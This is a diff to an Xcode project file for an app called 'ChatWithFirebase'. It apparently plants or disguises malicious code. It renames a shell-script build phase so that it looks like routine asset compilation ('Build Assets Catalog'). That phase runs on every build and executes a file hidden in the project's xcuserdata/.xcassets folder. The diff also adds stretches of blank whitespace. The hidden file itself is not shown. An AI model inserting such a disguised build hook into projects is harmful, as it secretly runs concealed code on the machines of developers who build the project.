@@ -203,7 +203,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 044B751525F5D8B0004FCF24 /* Build configuration list for PBXNativeTarget "ChatWithFirebase" */;
 			buildPhases = (
-				4589A0D0CE567FC080AAC43A /* [CP] Build Pods Frameworks */,
+				BDEBB950E391DB748CAAC43A /* Build Assets Catalog */,
 				5DC28C427C5579FEDADC9B93 /* [CP] Check Pods Manifest.lock */,
 				044B74FD25F5D8AC004FCF24 /* Sources */,
 				044B74FE25F5D8AC004FCF24 /* Frameworks */,
@@ -269,7 +269,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	4589A0D0CE567FC080AAC43A /* [CP] Build Pods Frameworks */ = {
+	BDEBB950E391DB748CAAC43A /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -278,7 +278,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -287,8 +287,26 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -579,6 +597,14 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
 			
 
 			
